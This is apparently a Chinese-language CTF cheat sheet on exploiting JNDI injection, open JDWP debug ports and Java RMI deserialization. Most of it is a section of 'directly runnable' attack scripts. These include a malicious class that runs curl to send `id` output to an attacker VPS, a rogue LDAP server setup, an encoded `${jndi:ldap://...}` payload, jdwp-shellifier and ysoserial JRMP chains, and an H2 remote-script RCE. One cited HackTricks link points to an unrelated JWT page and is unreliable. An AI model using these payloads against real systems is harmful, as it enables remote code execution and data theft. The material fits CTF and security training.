---
title: JNDI 注入 + JDWP / RMI 利用
category: web
tags: [jndi, jdwp, rmi, 反序列化, java]
signals: [jndi lookup, rmi 端口, 5005 端口, jdwp 调试, 8000 端口是 rmi, yard, ldap url, 远程引用类, jndi 注入点, 传参是 java 对象]
difficulty: hard
source: "marshalsec / 公开研究发现 / HackTricks"
tools: [marshalsec, jdwp-shellifier, jcmd, java]
updated: 2026-10-22
---

## 一、识别信号（题面长什么样）

- 输入被 `InitialContext.lookup(user_input)` 直接执行，URL 形如 `ldap://`、`rmi://`。
- 目标开放 **5005**（JDWP 调试端口）—— 直接连上去就能执行代码。
- 目标开放 **1099 / 1090**（RMI Registry）。
- 报错里有 `javax.naming.`、`com.sun.jndi.ldap`、`NamingException`。
- 题目提示"调试端口"、"JDWP"、"jmx"。
- 变体：Spring Boot Actuator `/env` 改 `spring.datasource.url` 触发 JDBC 连接池（Fastjson 链）。

## 二、原理

**JNDI 注入**：`lookup()` 支持 `ldap://`、`rmi://`、`dns://` 等协议。JDK 8u191 之前会从远程 codebase 加载 `Reference` 里指定的类 → RCE。之后需要：
- **本地工厂绕过**：LDAP 响应里指定 `javaFactory` 为已有类（`org.apache.naming.factory.BeanFactory` + `javax.el.ELProcessor`），利用目标 classpath 已有类。
- **反序列化**：RMI 客户端在 lookup 时会反序列化服务端返回的对象 → 用 ysoserial gadget。

**JDWP**：Java Debug Wire Protocol 无认证（老版本），可注入任意方法调用执行系统命令。工具 `jdwp-shellifier`。

**RMI**：`java -jar ysoserial.jar JRMPClient "host:1099"` 让目标连回攻击者的 JRMP 服务，再由攻击者下发 gadget。

## 三、解题步骤

1. 确认 JNDI 注入点，用 dnslog 验证。
2. 探测 JDK 版本（报错/特征），决定用远程 codebase 还是本地工厂。
3. 起 LDAP/RMI 服务（marshalsec / JNDI-Injection-Exploit）。
4. 若看到 5005：直接用 jdwp-shellifier 打调试端口。
5. 若看到 RMI：用 ysoserial 的 JRMPClient。

## 四、可直接运行的脚本

JNDI + LDAP 完整流程：

```bash
# 1. 编译恶意类（JDK8 及以前会从 codebase 加载）
mkdir -p /tmp/exploit && cd /tmp/exploit
cat > Exploit.java <<'EOF'
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec(new String[]{"/bin/sh","-c",
                "curl http://VPS:8000/$(id | base64)"});
        } catch (Exception e) {}
    }
}
EOF
javac -source 8 -target 8 Exploit.java
# 起 HTTP 服务托管 Exploit.class
python3 -m http.server 8000 &

# 2. 起恶意 LDAP
java -cp marshalsec-0.0.3-all.jar marshalsec.jndi.LDAPRefServer \
     "http://VPS:8000/#Exploit" 1389

# 3. 打 payload
curl "http://TARGET/api?name=%24%7Bjndi%3Aldap%3A%2F%2FVPS%3A1389%2FExploit%7D"
```

高版本 JDK 的本地工厂绕过（marshalsec 不支持时用 JNDIExploit）：

```bash
# JNDIExploit 内置 BeanFactory + ELProcessor 绕过
java -jar JNDIExploit-1.4-SNAPSHOT.jar -i VPS -p 8888
# 输出：
#   ldap://VPS:1389/Basic/Command/base64/<b64cmd>
#   ldap://VPS:1389/TomcatBypass/...
```

JDWP 利用（5005 端口）：

```bash
# 1. 探测是否开放
nmap -p 5005 -sV TARGET

# 2. jdwp-shellifier（需 JDK8 环境，Windows/Linux 均可）
git clone https://github.com/IOActive/jdwp-shellifier
python jdwp-shellifier.py -t TARGET -p 5005 \
  --break-on "java.net.ServerSocket.accept" \
  --cmd "curl http://VPS:8000/$(id|base64)"

# 3. 直接发 JDWP 包探测（无工具时）
python - <<'PY'
import socket
s = socket.create_connection(("TARGET", 5005), timeout=5)
s.sendall(b"JDWP-Handshake")
print(s.recv(14))     # 返回 JDWP-Handshake 即成功
PY
```

RMI + ysoserial：

```bash
# 1. 在 VPS 起 JRMP listener（ysoserial 自带）
java -cp ysoserial-all.jar ysoserial.exploit.JRMPListener 10999 CommonsCollections6 'curl http://VPS/x'

# 2. 让目标连回来
java -jar ysoserial-all.jar JRMPClient "VPS:10999" > jrmp.bin
# 3. 把 jrmp.bin 作为 JNDI 的 rmi:// 地址提交
curl "http://TARGET/api?x=rmi://VPS:10999/a"
```

## 五、常见坑 / 变体

- **JDK 8u191+/11+**：远程 codebase 默认 `com.sun.jndi.ldap.object.trustURLCodebase=false`，必须用本地工厂（Tomcat BeanFactory）或序列化 gadget。
- **目标没 Tomcat**：BeanFactory 绕过失效，需要目标 classpath 里有的类，用 `marshalsec` 的 `-X` 或 JNDIExploit 多格式输出。
- **JDWP 只监听 127.0.0.1**：需要结合 SSRF / 端口转发（`socat`）。
- **JDWP 高版本需要 `-agentlib:jdwp` 且可能带 token**：JDK 9+ 有 `suspend=y` 和无认证之分。
- 变体：**Actuator `/env` 注入**：`spring.datasource.url=jdbc:h2:mem:test;...INIT=RUNSCRIPT FROM 'http://VPS/1.sql'` 直接 RCE（H2 RCE）。
- 变体：**Consul/Nacos/Jolokia** 的 server-side JNDI lookup，见 `jolokia-realm.md`。
- 变体：**log4j 的 JNDI** 是此攻击的最常见入口（见 `jndi-log4shell.md`）。

## 六、参考来源

- [marshalsec - Java unmarshalling exploits](https://github.com/mbechler/marshalsec)
- [JNDI-Injection-Exploit](https://github.com/welk1n/JNDI-Injection-Exploit)
- [jdwp-shellifier（IOActive）](https://github.com/IOActive/jdwp-shellifier)
- [HackTricks - JNDI injection](https://book.hacktricks.wiki/en/pentesting-web/deserialization/jwt-json-web-token.html)
- [Oracle JDK 8u191 JNDI 安全约束说明](https://docs.oracle.com/javase/8/docs/technotes/guides/jndi/jndi-ldap-gl.html)
- [ysoserial JRMPClient / JRMPListener](https://github.com/frohoff/ysoserial)
